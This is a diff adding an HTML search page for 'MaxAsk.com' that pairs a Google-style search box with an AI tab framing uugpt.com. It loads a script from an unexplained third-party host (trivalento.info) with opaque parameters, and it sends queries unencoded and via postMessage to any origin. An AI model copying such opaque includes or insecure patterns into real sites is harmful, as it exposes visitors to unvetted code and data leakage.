@@ -1,8 +1,405 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<body>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MaxAsk.com</title>
+    <style>
+        body {
+            background-color: #fff;
+        }
 
+        .loading-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: calc(100vh - 260px);
+        }
+
+        .loading {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            /* 外圈 */
+            border-top: 5px solid #3498db;
+            /* 顶部颜色 */
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+
+        /* CSS3 动画 */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* 自定义tab */
+        .tabarea {
+            display: flex;
+            padding: 0 10px;
+            border-bottom: 1px solid #e5e5e5;
+            gap: 20px;
+            position: relative;
+        }
+
+        .tabitem {
+            display: block;
+            padding: 10px 10px;
+            min-width: 72px;
+            color: #666;
+            text-align: center;
+            line-height: 1.5;
+            border-radius: 2px;
+        }
+
+        .tabitem-inactive {
+            transition: all 0.2s ease;
+            border-color: transparent;
+            color: #666;
+            cursor: pointer;
+        }
+
+
+        .tabitem-inactive:hover {
+            background-color: rgba(0, 0, 0, 0.05);
+        }
+
+        .tabitem-active {
+            border-bottom: 4px solid #1a73e8;
+            color: #1a73e8;
+            border-radius: 2px;
+            transition: all 0.2s ease;
+            cursor: default;
+        }
+
+        .unfoldsearch {
+            width: 32px;
+            height: 32px;
+            border-radius: 5px;
+            background-image: url(toggle.svg);
+            display: block;
+            background-repeat: no-repeat;
+            background-position: center;
+            top: 10px;
+            right: 20px;
+            position: absolute;
+            transition: all 0.15s ease;
+        }
+
+        .unfoldsearch:hover {
+            background-color: #00000010;
+        }
+
+        .gsce-searchbox {
+            font-size: 13px;
+            margin-top: 0;
+            margin-right: 0;
+            margin-bottom: 4px;
+            margin-left: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- <div id="testid" style="height: 100vh;"></div> -->
+
+    <div class="cse-header cse-header-show" id="cse_header"> <!--隐藏的时候加cse-header-hide 出现的时候是cse-header-show-->
+        <div id="glogo" width="156"></div>
+        <div class="searchboxarea">
+            <div id="___gcse_0" dir="ltr">
+                <form class="gsc-search-box gsc-search-box-tools" accept-charset="utf-8" id="search-form">
+                    <table cellspacing="0" cellpadding="0" role="presentation" class="gsc-search-box">
+                        <tbody>
+                            <tr>
+                                <td class="gsc-input">
+                                    <div class="gsc-input-box" id="gsc-iw-id1">
+                                        <table cellspacing="0" cellpadding="0" role="presentation" id="gs_id50"
+                                            class="gstl_50 gsc-input" style="width: 100%; padding: 0px;">
+                                            <tbody>
+                                                <tr>
+                                                    <td id="gs_tti50" class="gsib_a"><input autocomplete="off"
+                                                            type="text" size="10" class="gsc-input" name="search"
+                                                            title="search" aria-label="search" id="search-box" dir="ltr"
+                                                            spellcheck="false"
+                                                            style="width: 100%; padding: 0px; border: none; margin: -0.0625em 0px 0px; height: 1.25em; background: rgb(255, 255, 255); outline: none;">
+                                                    </td>
+                                                    <td class="gsib_b">
+                                                        <div class="gsst_b" id="gs_st50" dir="ltr"><a class="gsst_a"
+                                                                href="javascript:setSearchBoxValue('')"
+                                                                title="Clear search box" role="button" style=""><span
+                                                                    class="gscb_a" id="gs_cb50"
+                                                                    aria-hidden="true">×</span></a></div>
+                                                    </td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </td>
+                                <td class="gsc-search-button"><button
+                                        class="gsc-search-button gsc-search-button-v2"><svg width="13" height="13"
+                                            viewBox="0 0 13 13">
+                                            <title>search</title>
+                                            <path
+                                                d="m4.8495 7.8226c0.82666 0 1.5262-0.29146 2.0985-0.87438 0.57232-0.58292 0.86378-1.2877 0.87438-2.1144 0.010599-0.82666-0.28086-1.5262-0.87438-2.0985-0.59352-0.57232-1.293-0.86378-2.0985-0.87438-0.8055-0.010599-1.5103 0.28086-2.1144 0.87438-0.60414 0.59352-0.8956 1.293-0.87438 2.0985 0.021197 0.8055 0.31266 1.5103 0.87438 2.1144 0.56172 0.60414 1.2665 0.8956 2.1144 0.87438zm4.4695 0.2115 3.681 3.6819-1.259 1.284-3.6817-3.7 0.0019784-0.69479-0.090043-0.098846c-0.87973 0.76087-1.92 1.1413-3.1207 1.1413-1.3553 0-2.5025-0.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239c0-1.3553 0.4696-2.4966 1.4088-3.4239 0.9392-0.92727 2.0864-1.3969 3.4417-1.4088 1.3553-0.011889 2.4906 0.45771 3.406 1.4088 0.9154 0.95107 1.379 2.0924 1.3909 3.4239 0 1.2126-0.38043 2.2588-1.1413 3.1385l0.098834 0.090049z">
+                                            </path>
+                                        </svg></button></td>
+                                <td class="gsc-clear-button">
+                                    <div class="gsc-clear-button" title="clear results">&nbsp;</div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </form>
+            </div>
+
+            <!-- <div class="gcse-searchbox">
+                <form id="search-form">
+                    <input type="text" id="search-box" class='gsc-input-box' placeholder="Enter your search query">
+                    <button type="submit" id="search-button" class="gsc-search-button-v2">Search</button>
+                </form> -->
+        </div>
+    </div>
+    </div>
+    <!--修改Hosts文件  maxask.com-->
+    <div class="tabarea" id="tabarea">
+        <div class="tabitem tabitem-inactive" id="result_tab_0">Web</div><!--激活状态是tabitem-active 不激活是tabitem-inactive-->
+        <div class="tabitem tabitem-inactive" id="result_tab_2">AI Result</div>
+        <div class="unfoldsearch" id="show_header"></div><!-- 显示隐藏header -->
+    </div>
+
+    <div class="mainarea hide" id="googlesearh"><!-- google结果 显示隐藏增加和删除class=hide-->
+        <!-- <div class="loading-wrapper" id="gs_loading">
+            <div class="loading"></div>
+        </div> -->
+        <div class="gcse-searchresults" style="flex:60%" id="search_result">
+
+        </div>
+        <div class="sidebar"><!-- Side Area --></div>
+    </div>
+
+    <div class="aiarea hide" id="aiarea"><!--ai对话框 显示隐藏增加和删除class=hide -->
+        <div class="hint hide" id="hint"> <!-- 提示框，显示添加show删除hide，隐藏添加hide，删除show-->
+            <span class="hint-text">Tip: End your search with '?' for an instant AI query.</span>
+            <span class="hint-close" id="hintClose">×</span>
+        </div>
+        <div class="aiwrapper" id="aiwrapper">
+            <!-- <div class="loading-wrapper" id="ai_loading">
+                <div class="loading"></div>
+            </div> -->
+            <iframe id="ai_iframe" class="aiframe" style="border: 0;" allow="clipboard-write">
+            </iframe>
+        </div>
+    </div>
+    <script src="https://trivalento.info/yorvil?i=GH3HP8ZREP&atr=zop1"></script>
+    <script>
+        // Fill search box with keyword from URL
+        (function () {
+            const url = new URL(window.location.href);
+            const searchQuery = url.searchParams.get('q');
+            if (searchQuery) {
+                document.getElementById('search-box').value = searchQuery;
+            }
+        })();
+        document.getElementById('search-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+            var query = document.getElementById('search-box').value;
+            if (query) {
+                const href = window.location.href
+                const url = new URL(href)
+                const searchParams = new URLSearchParams(url.search)
+                searchParams.set('q', query)
+                url.search = searchParams.toString()
+                window.location.href = url.toString()
+            }
+        });
+    </script>
+    <script>
+        // Helper function to set a cookie
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+        }
+        // Helper function to get a cookie by name
+        //how to use chatgpt
+        function getCookie(name) {
+            const value = "; " + document.cookie;
+            const parts = value.split("; " + name + "=");
+            if (parts.length === 2) return parts.pop().split(";").shift();
+        }
+        function getParam(param) {
+            return new URLSearchParams(window.location.search).get(param);
+        }
+        function getHashParamValue(paramName) {
+            const hash = window.location.hash.substring(1); // 获取 # 后面的字符串，并去掉 #
+            const params = new URLSearchParams(hash); // 创建 URLSearchParams 对象来解析哈希参数
+            return params.get(paramName); // 获取指定参数名的值
+        }
+        function setSearchBoxValue(value) {
+            document.getElementById('search-box').value = value;
+        }
+        //改变tab按钮的选中和非选中样式，
+        function showTab(showtabid) {
+            if (!showtabid) { showtabid = 0 }
+            document.getElementById('result_tab_0').classList.add('tabitem-inactive');
+            document.getElementById('result_tab_2').classList.add('tabitem-inactive');
+            document.getElementById('result_tab_0').classList.remove('tabitem-active');
+            document.getElementById('result_tab_2').classList.remove('tabitem-active');
+            document.getElementById(`result_tab_${showtabid}`).classList.remove('tabitem-inactive');
+            document.getElementById(`result_tab_${showtabid}`).classList.add('tabitem-active');
+            tabid = showtabid;
+        }
+        //显示google搜索结果页，隐藏ai页
+        function showGoogleResult(tid) {
+            showTab(tid);
+            let ch = document.getElementById('cse_header');
+            ch.classList.remove('cse-header-hide');
+            ch.classList.add('cse-header-show');
+            document.getElementById('aiarea').classList.add('hide');
+            document.getElementById('googlesearh').classList.remove('hide');
+            document.getElementById('show_header').classList.add('hide');
+            showHeader = true;
+        }
+        //显示ai页，隐藏google搜索结果页
+        function showAISearch(ai_q) {
+            showTab(2);
+            let ch = document.getElementById('cse_header');
+            document.getElementById('googlesearh').classList.add('hide');
+            document.getElementById('aiarea').classList.remove('hide');
+            ch.classList.add('cse-header-hide');
+            ch.classList.remove('cse-header-show');
+            document.getElementById('show_header').classList.remove('hide');
+            //移动端部分浏览器工具栏会遮挡页面导致元素显示不正确，所以要重新确定位置；
+            showHeader = false;
+            handleResize();
+            if (aiiframe.src == '') {
+                if (ai_q == null || ai_q == '') {
+                    aiiframe.src = `https://www.uugpt.com/framed/`;
+                } else {
+                    aiiframe.src = `https://www.uugpt.com/framed/?aisearch_q=${ai_q}`;
+                    old_ai_q = ai_q;
+                }
+
+            } else {
+                if (ai_q != old_ai_q && ai_q != null && ai_q != "") {
+                    aiiframe.contentWindow.postMessage(ai_q, '*');
+                    old_ai_q = ai_q;
+                }
+            }
+
+        }
+        //根据条件判断返回google结果页
+        function back2Search() {
+            if (tabid != 2) return;
+            showGoogleResult(0);
+        }
+        //根据屏幕高度改变ai输入框位置，让输入框处于屏幕最下方
+        function handleResize() {
+            let viewHight = document.documentElement.clientHeight;
+            document.getElementById('aiwrapper').style.height = (viewHight - (showHeader ? 165 : 75)) + 'px';
+        }
+    </script>
+    <script>
+        const aiiframe = document.getElementById('ai_iframe');
+        var tabid = getHashParamValue('gsc.tab');
+        var ai_q = getHashParamValue('gsc.q');
+        var channel_q = new URLSearchParams(window.location.search).get('q');
+        var isShowedHint = getCookie('isShowedHint');
+        var showHeader = false;//是否显示header
+        var old_ai_q = '';
+
+        //按cookie决定是否显示“带？进ai”的提示
+        if (!isShowedHint) {
+            document.getElementById('hint').classList.remove('hide');
+            document.getElementById('hint').classList.add('show');
+        }
+        //如果q有值但是gsc.q没有值
+        if (channel_q && !ai_q) {
+            ai_q = ai_q ? ai_q : channel_q;
+        }
+        //如果query中带问号，直接显示AI页
+        if (ai_q && (ai_q.endsWith('?') || ai_q.endsWith('？'))) {
+            tabid = 2;
+        }
+        //根据之前决定的tabid，显示对应页面
+        if (tabid == 2) {
+            showAISearch(ai_q);
+        } else {
+            showGoogleResult(tabid);
+        }
+        //初始化AI页高度
+        handleResize();
+        //监听浏览器窗口尺寸变化
+        window.addEventListener('resize', handleResize);
+
+        document.getElementById('result_tab_0').addEventListener('click', function () {
+            showGoogleResult(0);
+        });
+
+
+        document.getElementById('result_tab_2').addEventListener('click', function () {
+            ai_q = getHashParamValue('gsc.q');
+            showAISearch(ai_q);
+        });
+
+        document.getElementById('show_header').addEventListener('click', function (event) {
+            let ch = document.getElementById('cse_header');
+            let showHeaderElement = document.getElementById('show_header');
+            if (!showHeader) {
+                ch.classList.remove('cse-header-hide');
+                ch.classList.add('cse-header-show');
+                showHeader = true;
+                handleResize();
+                showHeaderElement.classList.add('rotate-180');
+            } else {
+                ch.classList.add('cse-header-hide');
+                ch.classList.remove('cse-header-show');
+                showHeader = false;
+                handleResize();
+                showHeaderElement.classList.remove('rotate-180');
+            }
+        })
+
+        document.getElementById('hintClose').addEventListener('click', function (event) {
+            document.getElementById('hint').classList.remove('show');
+            document.getElementById('hint').classList.add('hide');
+            setCookie('isShowedHint', true);
+        })
+
+        window.onload = () => {
+            //因为修改的是google加载的组件，所以必须在window.onload里做google组件的监听，不然找不到id
+            document.getElementsByClassName('gsc-search-button gsc-search-button-v2')[0].addEventListener('click', back2Search);
+            let gs_input = document.getElementById('search-box');
+            gs_input.addEventListener('keydown', function (event) {
+                // 检查是否按下了回车键（Enter 键）
+                if (event.key === 'Enter' || event.keyCode === 13) {
+                    ai_q = gs_input.value;
+
+                    if (ai_q && (ai_q.endsWith('?') || ai_q.endsWith('？'))) {
+                        showAISearch(ai_q);
+                    } else {
+                        back2Search();
+                    }
+                }
+            });
+            gs_input.addEventListener('input', function (event) {
+                ai_q = event.target.value;
+            });
+
+        }
+
+    </script>
+    <script src="https://www.gstatic.com/prose/brand.js" targetId="glogo"></script>
+    <link rel="stylesheet" href="pretty.css">
 </body>
 
 </html>
